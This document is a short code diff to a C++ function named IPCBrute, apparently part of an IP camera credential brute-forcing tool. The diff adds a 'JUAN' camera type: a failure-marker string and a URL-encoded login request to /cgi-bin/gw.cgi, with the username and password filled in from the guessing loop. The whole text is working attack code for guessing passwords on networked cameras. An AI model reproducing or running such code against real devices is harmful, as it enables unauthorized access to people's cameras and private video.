@@ -79,6 +79,10 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 	{
 		negVector.push_back("/error.asp");
 	}
+	else if (strcmp(SPEC, "JUAN") == 0)
+	{
+		negVector.push_back("errno=\"4\"");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
@@ -172,6 +176,12 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
 			else if (strcmp(SPEC, "BEWARD") == 0)
 			{
 				sprintf(request, "%s:%d/webs/httplogin?username=%s&password=%s&UserID=45637757",
+					ip, port, login, pass);
+			}
+			else if (strcmp(SPEC, "JUAN") == 0)
+			{
+				//sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=<juan ver=\"\" squ=\"\" dir=\"\"><envload type=\"0\" usr=\"%s\" pwd=\"%s\"/></juan>&_=1450923182693",
+				sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
 					ip, port, login, pass);
 			}
 			
